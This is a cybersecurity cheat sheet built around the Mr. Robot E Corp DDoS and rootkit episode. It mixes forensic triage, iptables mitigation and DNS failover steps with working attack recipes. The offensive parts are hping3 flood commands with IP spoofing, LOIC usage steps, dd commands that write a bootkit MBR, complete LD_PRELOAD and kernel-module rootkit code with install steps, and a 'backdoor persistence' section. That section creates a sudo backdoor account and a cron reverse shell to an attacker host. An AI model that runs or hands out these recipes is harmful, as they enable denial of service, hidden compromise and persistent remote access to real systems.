# Mr. Robot — E Corp DDoS & Rootkit Incident: Full Technical Cheat Sheet

---

## PART 1 — DDoS Attack: Types, Mechanisms & Real-World Execution

### 1.1 What Is a DDoS Attack?

A Distributed Denial of Service (DDoS) attack overwhelms a target's resources (bandwidth, CPU, memory, connection tables) with traffic from multiple sources, making the service unavailable to legitimate users.

**Key characteristics:**
- Traffic originates from many distributed sources (a botnet)
- The goal is resource exhaustion, not data theft
- Can target network layer (L3/L4) or application layer (L7)

### 1.2 Common DDoS Attack Types

| Type | Layer | Mechanism | Effect |
|------|-------|-----------|--------|
| SYN Flood | L4 (TCP) | Sends massive SYN packets with spoofed source IPs; server allocates resources for half-open connections that never complete | Connection table exhaustion |
| UDP Flood | L3/L4 | Floods target with UDP packets to random ports | Bandwidth saturation, ICMP port-unreachable storms |
| ICMP Flood | L3 | Floods target with ICMP Echo requests | Bandwidth and CPU exhaustion |
| HTTP Flood | L7 | Sends legitimate-looking HTTP requests at high volume | Application server resource exhaustion |
| DNS Amplification | L3/L4 | Exploits open DNS resolvers to send large responses to spoofed target IP | Massive bandwidth amplification |

### 1.3 Real-World DDoS Tools & Commands

**hping3 — SYN Flood Attack**

hping3 is an open-source packet generator and analyzer for crafting custom TCP/IP packets, pre-installed on Kali Linux.

```bash
# Install hping3
sudo apt update && sudo apt install hping3

# Basic SYN flood attack (flood target port 80)
sudo hping3 -S --flood -p 80 <target_IP>

# SYN flood with spoofed source IP
sudo hping3 -S --flood --spoof <spoofed_IP> -p <target_port> <target_IP>

# UDP flood attack
sudo hping3 --udp --flood -p <target_port> <target_IP>

# ICMP flood attack
sudo hping3 --icmp --flood <target_IP>

# Christmas Tree packet attack (all TCP flags set)
sudo hping3 --flood --rand-source --destport 80 --syn --ack --fin --rst --push --urg --xmas <target_IP>
```

**Flag explanations:**
- `-S`: Send SYN packets
- `--flood`: Send packets as fast as possible
- `--spoof <IP>`: Spoof the source IP address
- `-p <port>`: Target port number
- `--udp`: Send UDP packets
- `--icmp`: Send ICMP packets
- `--rand-source`: Randomize source IP addresses

### 1.4 LOIC (Low Orbit Ion Cannon)

LOIC is an open-source DDoS tool with a GUI. Users input a target IP/URL, select attack type (TCP, UDP, or HTTP), and set the attack intensity (threads, packet size).

**Usage flow:**
1. Download and launch LOIC
2. Enter target IP or URL in "Target Section 1"
3. Select attack method: TCP, UDP, or HTTP
4. Adjust attack speed via slider
5. Click "IMMA CHARGIN MAH LAZER" to start

LOIC was used by Anonymous in coordinated DDoS campaigns against RIAA and payment processors. A modified version included a "Hive Mind" feature that allowed it to act as a remotely controlled voluntary botnet client over IRC.

### 1.5 Mirai Botnet — IoT-Based DDoS

Mirai is an IoT botnet that compromises devices (routers, IP cameras) via Telnet using default credentials. It has ten different attack types and is controlled via C2 servers.

**Mirai DDoS attack commands:**
```
UDP flood attack on IP address 1.2.3.4 for 10 seconds
```

When Mirai receives the attack order, it executes the corresponding flood. In a controlled experiment, Mirai sent approximately 80,000 UDP packets in 10 seconds to a single target.

**Mirai attack types:**
- `attack_udp_generic()` — UDP Flooding
- `attack_udp_plain()` — UDP Plain Flooding
- `syn` — TCP SYN Flood
- `ack` — TCP ACK Flood
- `stomp` — DDoS via STOMP protocol
- `handshake` — Massive TCP connections with random data

**Mirai infection flow:**
1. Scans random IP addresses for open Telnet (port 23)
2. Attempts login via dictionary attack (common username/password combinations)
3. When successful, sends `/bin/busybox MIRAI` to check the environment
4. Reports successful infection to the Report server (resolved via `report.changeme.com`)
5. Reports: IP address, port, username, password length


## PART 2 — Rootkit: Types, Creation, Persistence & Detection

### 2.1 What Is a Rootkit?

A rootkit is stealthy malware that gains privileged access (Ring 0 / kernel level) and actively hides its presence from the OS and security software. Rootkits differ from viruses: they don't self-replicate; they persist and hide.

### 2.2 Rootkit Types

| Type | Level | Persistence Mechanism |
|------|-------|----------------------|
| User-mode (LD_PRELOAD) | User space | Hooks library calls via dynamic linker |
| Kernel-mode (LKM) | Kernel space | Loadable kernel module modifies syscall table |
| Bootkit (MBR/VBR) | Below OS | Infects Master Boot Record; loads before kernel |
| Firmware/UEFI | Hardware | Infects UEFI firmware; survives OS reinstall |

### 2.3 Bootkit Persistence: Why Rebooting Re-Infected the Servers

The rootkit in the show was a **bootkit** — it infected the **Master Boot Record (MBR)** , the first 512 bytes of the disk that the BIOS reads to locate the OS. Because the bootkit loads **before** the operating system, it can:
1. Intercept file system calls
2. Hide its own files and processes
3. Re-install itself on every boot

**Real-world HDD Rootkit analysis (Winnti APT):**
- Sector 1: Modified MBR containing the bootkit
- Sector 25: BootCode
- Sectors 26-27: Encrypted original MBR
- The RKimage module runs before the OS, parses the Ext file system, decrypts the backdoor, and adds it to startup scripts

**How a bootkit is installed (real-world):**
```bash
# 1. Back up the original MBR (first 512 bytes)
sudo dd if=/dev/sda of=/root/mbr_backup.bin bs=512 count=1

# 2. Inspect the MBR for the boot signature (55 aa)
xxd /root/mbr_backup.bin | tail -5

# 3. Write the malicious MBR (bootkit payload)
sudo dd if=/path/to/bootkit_mbr.bin of=/dev/sda bs=512 count=1

# 4. Hide the original MBR in unused sectors
sudo dd if=/root/mbr_backup.bin of=/dev/sda bs=512 seek=26 count=1

# 5. Verify the modification
sudo dd if=/dev/sda of=/root/mbr_after.bin bs=512 count=1
xxd /root/mbr_after.bin | head -20
```

### 2.4 User-Mode Rootkit via LD_PRELOAD

The `LD_PRELOAD` environment variable forces the dynamic linker to load a specified shared library before any other library. A rootkit can hook library functions (like `readdir`, `open`, `read`) to hide its presence.

**Creating an LD_PRELOAD rootkit:**

```c
// hide.c — hook readdir to hide files/processes containing "evil"
#define _GNU_SOURCE
#include <dirent.h>
#include <dlfcn.h>
#include <string.h>

struct dirent *readdir(DIR *dirp) {
    struct dirent *(*real_readdir)(DIR *);
    real_readdir = dlsym(RTLD_NEXT, "readdir");

    struct dirent *entry;
    while ((entry = real_readdir(dirp)) != NULL) {
        if (strstr(entry->d_name, "evil") == NULL) {
            return entry;
        }
    }
    return NULL;
}
```

**Compile and deploy:**
```bash
# Compile the shared library
gcc -shared -fPIC -o hide.so hide.c -ldl

# Add to system-wide preload (persists across reboots)
echo "/lib/hide.so" > /etc/ld.so.preload

# Or set via environment variable (session-only)
export LD_PRELOAD=$PWD/hide.so
```

**Verify the hook is active:**
```bash
ldd /bin/ls | grep hide.so
# Output: /tmp/hide.so (0x00007f...)
```

When active, any dynamically linked executable in that shell will load the rootkit library first. Even standard shells like bash and dash are vulnerable to hooking.

### 2.5 Kernel-Mode Rootkit (LKM)

A kernel module rootkit modifies the syscall table to intercept system calls.

**Basic LKM structure:**
```c
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>

// Save original syscall
asmlinkage long (*original_kill)(pid_t pid, int sig);

// Hooked syscall
asmlinkage long hooked_kill(pid_t pid, int sig) {
    if (sig == 0) {
        return -ESRCH;  // Hide process
    }
    return original_kill(pid, sig);
}

static int __init rootkit_init(void) {
    original_kill = (void *)sys_call_table[__NR_kill];
    write_cr0(read_cr0() & ~0x10000);  // Disable write protection
    sys_call_table[__NR_kill] = hooked_kill;
    write_cr0(read_cr0() | 0x10000);   // Re-enable
    return 0;
}
```

**Compile and load:**
```bash
# Create Makefile
obj-m += rootkit.o
all:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

# Build and insert
make
sudo insmod rootkit.ko

# Verify module is loaded
lsmod | grep rootkit
```


## PART 3 — Forensic Investigation: Real-World Commands

### 3.1 Initial Triage — What to Check First

**Check overall packet rates and connection state:**
```bash
# Packet rates (PPS and bandwidth)
sar -n DEV 1 5

# Top connections by count
ss -ntu | awk 'NR>1 {print $5}' | cut -d: -f1 | sort | uniq -c | sort -rn | head -20

# Established connection count
ss -s

# Check for SYN backlog filling (SYN_RECV state)
ss -ntp state syn-recv | wc -l

# Real-time packet rates per protocol
watch -n1 'cat /proc/net/dev'

# Check for UDP flood (high UDP packet counters)
netstat -su | grep -i "receive\|error\|discard"
```

**What to look for:**
- **High SYN_RECV count** → SYN flood in progress
- **Thousands of connections from few IPs** → Distributed HTTP/TCP connection flood
- **UDP receive errors spiking** → UDP flood or amplification attack
- **High PPS with small packet sizes** → Volumetric flood (SYN, UDP, ICMP)
- **Normal PPS but high CPU in application** → HTTP flood or slowloris

### 3.2 Packet Capture & Analysis

**Real-time capture with tcpdump:**
```bash
# Capture all traffic on eth0
sudo tcpdump -i eth0 -w suspicious.pcap

# Capture only traffic from a specific host (excluding SSH noise)
sudo tcpdump -i eth0 -w suspicious.pcap host <suspect_IP> and port not 22

# Capture only SYN packets (SYN flood signature)
sudo tcpdump -i eth0 'tcp[tcpflags] & (tcp-syn) != 0' -c 1000

# Capture SYN packets on privileged ports
sudo tcpdump -i eth0 'tcp[tcpflags] & (tcp-syn) != 0' and 'tcp portrange 1-1024'

# Capture UDP traffic (possible flood)
sudo tcpdump -i eth0 -n udp

# Capture ICMP traffic
sudo tcpdump -i eth0 -n icmp or icmp6

# Capture non-standard HTTP ports
sudo tcpdump -i eth0 -n -A 'port ! 80 and port ! 443 and (tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x48545450)'
```

**Offline analysis with tshark:**
```bash
# Filter SYN packets without ACK (SYN flood)
tshark -r capture.pcap -Y "tcp.flags.syn == 1 && tcp.flags.ack == 0"

# Count SYN packets per source IP (identify top attackers)
tshark -r capture.pcap -Y "tcp.flags.syn == 1 && tcp.flags.ack == 0" | awk '{print $3}' | sort | uniq -c | sort -nr | head -20

# Detect retransmissions and duplicate ACKs
tshark -r capture.pcap -Y "tcp.analysis.retransmission or tcp.analysis.duplicate_ack"

# Detect abnormal fragmentation
tshark -r capture.pcap -Y "ip.flags.mf == 1 or ip.frag_offset > 0"
```

### 3.3 Port Scanning with nmap

Elliot's `status -scanports` command is fictional; the real-world equivalent is **nmap**.

```bash
# Scan a specific port range
nmap -p 80-7655 <target_IP>

# Fast scan of all ports
nmap -p- -T4 <target_IP>

# Service version detection
nmap -sV -p 21,22,23,25,80,139,443,666 <target_IP>

# Stealth SYN scan
nmap -sS -sU -A -v -Pn -T4 <target_IP>

# Scan entire subnet
nmap -sn 23.234.45.0/24
```

**Interpreting nmap output:**
| State | Meaning |
|-------|---------|
| `open` | Port is accepting connections (potential backdoor) |
| `closed` | Port is accessible but no service listening |
| `filtered` | Firewall is blocking probes (state unknown) |
| `unfiltered` | Port is accessible but nmap cannot determine open/closed |

### 3.4 Process Analysis

```bash
# List all processes running as root
ps aux | grep root

# Sort by CPU usage (find resource-hogging malware)
ps aux --sort=-%cpu | head -20

# Find processes without a TTY (daemonized malware)
ps auxww | grep -v "^\[" | awk '$7 == "?" {print}'

# Get full command line for a suspicious PID
cat /proc/<PID>/cmdline | tr '\0' ' '

# Check open files for a process
lsof -p <PID>

# Check network connections for a process
netstat -tulpen | grep <PID>

# Check the executable's path
ls -la /proc/<PID>/exe

# Check process environment (malware often sets custom vars)
cat /proc/<PID>/environ | tr '\0' '\n'

# Check for hidden processes using chkrootkit
sudo chkrootkit
sudo unhide proc
```

### 3.5 Network Connection Analysis

```bash
# List all listening TCP/UDP ports with process IDs
sudo netstat -tulpen

# Show all established connections
netstat -ant | grep ESTABLISHED

# Show connections by state
ss -tan state established
ss -tan state syn-recv

# Show processes using network
sudo lsof -i -P -n

# Watch connections in real-time
watch -n1 'ss -ntu'
```

### 3.6 Filesystem Integrity Checks

```bash
# Search for suspicious files in /root
find /root -type f \( -name "*.txt" -o -name "*.dat" -o -name "readme*" \)

# Check for hidden files
ls -la /root/fsociety/

# Find recently modified files (last 24 hours)
find / -mtime -1 -type f 2>/dev/null | grep -v "^/proc\|^/sys\|^/dev"

# Find files with unusual permissions (SUID/SGID)
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null

# Check for world-writable files
find / -perm -0002 -type f 2>/dev/null | grep -v "^/proc\|^/sys\|^/dev"
```

### 3.7 Rootkit Detection Tools

```bash
# chkrootkit — check for known rootkits
sudo chkrootkit

# rkhunter — rootkit hunter
sudo rkhunter --check

# unhide — find hidden processes and TCP/UDP ports
sudo unhide proc
sudo unhide sys
sudo unhide-tcp

# Check for LD_PRELOAD hooks
cat /etc/ld.so.preload
echo $LD_PRELOAD
ldd /bin/ls | grep -v "libc\|ld-linux"

# Check kernel module integrity
lsmod
sudo modinfo <suspicious_module>
```

### 3.8 Blocking & Mitigation

**iptables — Block specific attacking IPs:**
```bash
# Block a specific IP immediately
sudo iptables -I INPUT -s 203.0.113.42 -j DROP

# Block a subnet
sudo iptables -I INPUT -s 203.0.113.0/24 -j DROP

# Block using ipset (for large lists)
sudo ipset create blocklist hash:net
sudo ipset add blocklist 203.0.113.0/24
sudo iptables -I INPUT -m set --match-set blocklist src -j DROP

# Make rules persistent
sudo iptables-save > /etc/iptables/rules.v4
```

**iptables — Rate limiting for SYN floods:**
```bash
# Limit new SYN connections to 25/second per source IP
sudo iptables -A INPUT -p tcp --syn -m limit --limit 25/s --limit-burst 50 -j ACCEPT
sudo iptables -A INPUT -p tcp --syn -j DROP

# More granular: track per-source SYN rate
sudo iptables -N SYN_FLOOD
sudo iptables -A INPUT -p tcp --syn -j SYN_FLOOD
sudo iptables -A SYN_FLOOD -m limit --limit 2/s --limit-burst 6 -j RETURN
sudo iptables -A SYN_FLOOD -j DROP
```

**iptables — Rate limiting for UDP floods:**
```bash
# Limit UDP traffic to 1000 PPS total
sudo iptables -A INPUT -p udp -m limit --limit 1000/s --limit-burst 2000 -j ACCEPT
sudo iptables -A INPUT -p udp -j DROP

# Block UDP to DNS amplification ports
sudo iptables -A INPUT -p udp --dport 53 -m limit --limit 100/s --limit-burst 200 -j ACCEPT
sudo iptables -A INPUT -p udp --dport 53 -j DROP
```

**Disable a network interface:**
```bash
sudo ifconfig eth0 down
# Or
sudo ip link set eth0 down
```

**Set static IP and default gateway:**
```bash
sudo ifconfig eth0 23.234.45.62 netmask 255.255.255.0
sudo route add default gw 23.234.45.1
```


## PART 4 — DNS Failover & Traffic Re-Routing

### 4.1 Why DNS Failover Was Necessary

When the primary E Corp server was compromised, Elliot needed to redirect legitimate traffic to a **backup server** so the service could remain available while the infected server was wiped.

### 4.2 Real-World DNS Failover with nsupdate

The `nsupdate` command performs dynamic DNS updates to a DNS server.

```bash
# Start nsupdate interactive session
nsupdate

# Specify the DNS server
> server 145.23.12.11

# Remove the old DNS mapping for the primary server
> update delete www.ecorp.com A

# Add the new DNS mapping pointing to the backup server
> update add www.ecorp.com 300 A 23.234.45.62

# Send the update
> send
> quit
```

**Batch mode (non-interactive):**
```bash
nsupdate <<EOF
server 145.23.12.11
update delete www.ecorp.com A
update add www.ecorp.com 300 A 23.234.45.62
send
EOF
```

**Cloud DNS example (AWS Route 53):**
```bash
aws route53 change-resource-record-sets --hosted-zone-id Z123456 \
  --change-batch '{"Changes":[{"Action":"UPSERT","ResourceRecordSet":{"Name":"www.ecorp.com","Type":"A","TTL":300,"ResourceRecords":[{"Value":"23.234.45.62"}]}}]}'
```

### 4.3 DNS Configuration Files

```bash
# View current DNS servers
cat /etc/resolv.conf

# Add DNS servers manually
echo "nameserver 45.85.123.10" | sudo tee /etc/resolv.conf
echo "nameserver 45.85.124.10" | sudo tee -a /etc/resolv.conf
echo "nameserver 45.85.125.10" | sudo tee -a /etc/resolv.conf

# Verify DNS resolution
dig www.ecorp.com
nslookup www.ecorp.com
```


## PART 5 — Scene-by-Scene Analysis: Elliot's Commands Decoded

### 5.1 The Call & Initial Triage

**Scene:** Angela calls Elliot at midnight. E Corp's servers are under DDoS attack.

**Elliot's approach:**
1. He arrives at Allsafe and assesses the situation
2. He listens to Lloyd's explanation of a "rootkit"
3. He identifies that the attack is not a simple DDoS

**Key insight — "It's not just a DDoS":**

Elliot realizes the DDoS is a **diversion**. The real attack is the rootkit installation. The DDoS forces E Corp to reboot servers, which activates the bootkit.

**Real-world equivalent — checking for rootkit indicators:**
```bash
# Check for unusual processes
ps aux | grep -v "^\[" | grep -v "systemd\|kernel\|kworker\|migration\|rcu\|watchdog"

# Check for listening ports that shouldn't be there
sudo netstat -tulpen | grep -v "127.0.0.1\|::1"

# Check for unusual cron jobs
crontab -l
sudo ls -la /etc/cron.*
cat /etc/crontab
```

### 5.2 Port Scan Output Analysis

**Fictional command:**
```
status -scanports -s WBUS11234578WB1 -p [80-7655]
```

**Output:**
```
WBUS11234578WB1 [23.234.45.66]:
Unavailable: [80-3456]
Open: [3457-6555]
Closed: [6556-7987]
```

**Real-world equivalent:**
```bash
nmap -p 80-7655 23.234.45.66
```

**What the data reveals:**
| Range | State | Meaning |
|-------|-------|---------|
| 80-3456 | Unavailable | Ports not responding — possibly filtered by firewall or the service is down |
| 3457-6555 | Open | Ports accepting connections — **abnormal**. A normal web server should not have thousands of open ports |
| 6556-7987 | Closed | Ports responding with RST — no service listening |

**Elliot's deduction:** Thousands of open ports indicate the attacker has installed **backdoor listeners** across the port range. The machine is fully compromised. This is why he says it's "worse than he thought" — it's not just a DDoS; the attackers have persistent access.

**Real-world follow-up commands:**
```bash
# Identify what process is listening on suspicious ports
sudo lsof -i :3457
sudo netstat -tulpen | grep 3457

# Check if the process is a known binary
ls -la /proc/<PID>/exe
md5sum /proc/<PID>/exe
```

### 5.3 Process List Analysis

**Fictional command:**
```
ps aux | grep root
```

**Output:**
```
root  1744  0.0  3.0  89320  14m  ?  S  ...  terminal
root     1  0.0  0.4   3648 2016  ?  S  ...  init
root    24  0.0  0.0      0    0  ?  S  ...  [ksoftirqd]
root  2452  0.0  0.0      0    0  ?  S  ...  evilsorpwbthread
root    36  0.0  0.0      0    0  ?  S  ...  [events]
root  5985  0.0  0.0      0    0  ?  S  ...  evilsorpwbworker
```

**Red flags:**
- **PID 2452** (`evilsorpwbthread`) and **PID 5985** (`evilsorpwbworker`): Running as root, no TTY (daemonized), 0% CPU/memory — **hidden by the rootkit**
- **PID 24**: Nice value `-20` (highest priority), kernel thread

**Real-world equivalent investigation:**
```bash
# Get full command line for PID 2452
cat /proc/2452/cmdline | tr '\0' ' '

# Check open files
lsof -p 2452

# Check network connections
netstat -tulpen | grep 2452

# Check the executable's path
ls -la /proc/2452/exe

# Check environment variables
cat /proc/2452/environ | tr '\0' '\n'

# Check memory maps
cat /proc/2452/maps
```

### 5.4 The `readme.txt` File

**Scene:** Elliot finds `readme.txt` containing "LEAVE ME HERE" in `/root/fsociety/`.

**Real-world equivalent:**
```bash
# List all files including hidden ones
ls -la /root/fsociety/

# Search for suspicious files
find /root -type f -name "*.txt" -o -name "*.dat" -o -name "readme*"

# Check file contents
cat /root/fsociety/readme.txt

# Check file metadata
stat /root/fsociety/readme.txt
file /root/fsociety/readme.txt
```

**Elliot's decision:** He leaves the file and changes its permissions to create a backdoor for himself.

**Real-world backdoor persistence:**
```bash
# Create a backdoor user account
sudo useradd -m -s /bin/bash -G sudo backdoor
echo "backdoor:password" | sudo chpasswd

# Add a cron job for reverse shell
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/<attacker_IP>/4444 0>&1'" | crontab -
```

### 5.5 Server Room Commands — DNS Failover

**Fictional command sequence:**
```
Map sectionus34567
Locate server WBKUW300PS345672
astsu -info -backup -short
```

**Real-world equivalent:**
```bash
# Discover hosts on the network
nmap -sn 23.234.45.0/24

# Check server information
hostnamectl
ip addr show
ip route show
cat /etc/resolv.conf
```

**Server info output (fictional):**
```
server: WBKUW300PS345672
status: Online
server: [23.234.45.66]
default gateway: [23.234.45.1]
domain: EVDBUSRG32U
DNS: 45.85.123.10; 45.85.124.10; 45.85.125.10
DNS gateway: 145.23.12.11
bkup: BKUW300PS345672
```

**Real-world commands to gather this info:**
```bash
# View network configuration
ifconfig eth0
ip addr show eth0
ip route show
cat /etc/resolv.conf
hostname
hostname -f
```

### 5.6 Disabling Compromised Interfaces

**Fictional commands:**
```
astsu -close port: * -persistent
astsu -ifconfig disable
```

**Output:**
```
waneth01 [23.234.45.66:80]: disabled
waneth02 [23.234.45.66:201]: disabled
waneth03 [23.234.45.66:301]: disabled
waneth04 [23.234.45.66:401]: disabled
waneth05 [23.234.45.66:501]: disabled
waneth06 [23.234.45.66:601]: disabled
```

**Real-world equivalent:**
```bash
# Block all incoming traffic persistently
sudo iptables -A INPUT -j DROP
sudo netfilter-persistent save

# Disable a network interface
sudo ifconfig eth0 down
# Or
sudo ip link set eth0 down

# Block specific ports
sudo iptables -A INPUT -p tcp --dport 80 -j DROP
sudo iptables -A INPUT -p tcp --dport 201 -j DROP
```

### 5.7 Re-Enabling and Re-Configuring the Backup Server

**Fictional commands:**
```
astsu -open port: * -persistent
set waneth0* : * 23.234.45.1 255.255.255.0 [45.85.123.10; 45.85.124.10; 45.85.125.10]
waneth01 [23.234.45.62:80]: ... SET
waneth04 [23.234.45.62:441]: failed
set -force-ovr02 waneth04: 23.234.45.62:441 23.234.45.1 255.255.255.0 [...]
waneth04 [23.234.45.62:441]: set warning: [9232]
```

**Real-world equivalent:**
```bash
# Re-enable the interface
sudo ifconfig eth0 up

# Set a static IP
sudo ifconfig eth0 23.234.45.62 netmask 255.255.255.0

# Set the default gateway
sudo route add default gw 23.234.45.1

# Update DNS servers
echo "nameserver 45.85.123.10" | sudo tee /etc/resolv.conf
echo "nameserver 45.85.124.10" | sudo tee -a /etc/resolv.conf
echo "nameserver 45.85.125.10" | sudo tee -a /etc/resolv.conf

# If a port fails to set, force the configuration
sudo iptables -A INPUT -p tcp --dport 441 -j ACCEPT
sudo iptables -A OUTPUT -p tcp --sport 441 -j ACCEPT
```

### 5.8 Tracing the Malicious Process

**Fictional command:**
```
astu trace -pid 244 -cmd
trace placed...
```

**Real-world equivalent:**
```bash
# Trace system calls of a suspicious process
sudo strace -p <PID> -f -o /tmp/trace.log

# Trace network syscalls only
sudo strace -p <PID> -e trace=network

# Trace file operations
sudo strace -p <PID> -e trace=open,read,write,close

# Check what files the process has open
sudo lsof -p <PID>

# Check loaded libraries
cat /proc/<PID>/maps | grep "\.so"
```


## PART 6 — Complete Summary Table: Fictional vs. Real Commands

| Scene | Fictional Command | Real-World Equivalent |
|-------|-------------------|----------------------|
| Port Scan | `status -scanports -s <server> -p [80-7655]` | `nmap -p 80-7655 23.234.45.66` |
| Process List | `ps aux \| grep root` | `ps aux \| grep root` |
| Locate Server | `Locate server <server_name>` | `nmap -sn 23.234.45.0/24` |
| Server Info | `astsu -info -backup -short` | `hostnamectl && ip addr && ip route` |
| Disable Ports | `astsu -close port: * -persistent` | `iptables -A INPUT -j DROP` |
| Enable Ports | `astsu -open port: * -persistent` | `iptables -A INPUT -j ACCEPT` |
| Set Gateway | `set waneth0* : * 23.234.45.1` | `route add default gw 23.234.45.1` |
| DNS Failover | `dmctl: ... set waneth04` | `nsupdate` or cloud DNS API |
| List Files | `astsu -ls ./root/fsociety/ -a` | `ls -la /root/fsociety/` |
| Delete Files | `astsu -rm -norecycle /root/fsociety/` | `rm -rf /root/fsociety/` |
| Trace Process | `astu trace -pid 244 -cmd` | `strace -p 244 -f` |
| Check Ports | `astsu -ifconfig disable` | `ifconfig eth0 down` |


## PART 7 — Critical Details Often Missed

### 7.1 The DDoS Was a Ruse
The DDoS was not the primary attack. It was designed to force E Corp to **reboot servers**, which would trigger the bootkit's payload. The real attack was the rootkit installation and the eventual data exfiltration from E Corp.

### 7.2 The Rootkit Was Disguised as a Startup Daemon
The rootkit was part of the server startup sequence, causing servers to crash repeatedly on every reboot. This is why rebooting made things worse — each reboot propagated the infection.

### 7.3 Elliot's Role Was Unintentional
Elliot later discovers that **he** was the one who planted the fsociety rootkit, manipulated by Mr. Robot. The `readme.txt` saying "LEAVE ME HERE" was a message from fsociety to him.

### 7.4 The "Warning: [9232]" Error
The fictional error code `[9232]` in the `set -force-ovr02` command indicates a configuration conflict that was force-overridden. In real-world terms, this could represent:
- A port already in use
- A conflicting firewall rule
- A routing table conflict

**Real-world equivalent:**
```bash
# Check for port conflicts
sudo netstat -tulpen | grep :441

# Check for conflicting routes
ip route show
route -n

# Force the configuration
sudo ip route add 23.234.45.62/32 dev eth0
sudo iptables -I INPUT -p tcp --dport 441 -j ACCEPT
```

### 7.5 The Backup Server IP Change
The backup server `BKUW300PS345672` was reconfigured from `23.234.45.66` to `23.234.45.62`, and its ports were changed from 80/201/301/401/501/601 to 80/221/331/441/551/661. This represents a **complete network reconfiguration** to isolate the compromised primary server.

**Real-world equivalent:**
```bash
# Change IP address
sudo ifconfig eth0 23.234.45.62 netmask 255.255.255.0

# Change listening ports (example for SSH)
sudo sed -i 's/^Port 22/Port 221/' /etc/ssh/sshd_config
sudo systemctl restart sshd

# Update firewall rules for new ports
sudo iptables -A INPUT -p tcp --dport 221 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 331 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 441 -j ACCEPT
```

### 7.6 The `set -force-ovr02` Command
This fictional command forces a configuration override when a normal `set` command fails. In real-world networking, this is analogous to:

```bash
# Force an interface configuration that conflicts with existing settings
sudo ip addr add 23.234.45.62/24 dev eth0

# Force a route that may conflict
sudo ip route replace default via 23.234.45.1 dev eth0

# Override a firewall rule that is blocking traffic
sudo iptables -I INPUT 1 -p tcp --dport 441 -j ACCEPT
```


## PART 8 — Complete Attack Chain: From DDoS to Rootkit to DNS Failover

| Phase | Attacker Action | Defender Response | Real-World Tool |
|-------|----------------|-------------------|-----------------|
| 1 | Launch DDoS on E Corp | Detect abnormal traffic, begin triage | hping3, LOIC, Mirai |
| 2 | DDoS forces server reboots | Reboot servers to restore service | - |
| 3 | Bootkit activates on reboot | Notice servers crashing repeatedly | MBR analysis, dd |
| 4 | Rootkit spreads to all servers | Identify rootkit via port scan, process list | nmap, ps, lsof, netstat |
| 5 | Attacker maintains persistence | Discover `readme.txt`, `evilsorpwbthread` | strace, /proc analysis |
| 6 | Defender isolates compromised servers | Disable interfaces, block ports | iptables, ifconfig |
| 7 | Defender redirects traffic to backup | DNS failover to backup server | nsupdate, route |
| 8 | Defender wipes and reinstalls servers | Full disk wipe, OS reinstall | dd, PXE boot |
| 9 | Attacker leaves backdoor | Elliot leaves file, changes permissions | chmod, useradd, crontab |



2026/09/16
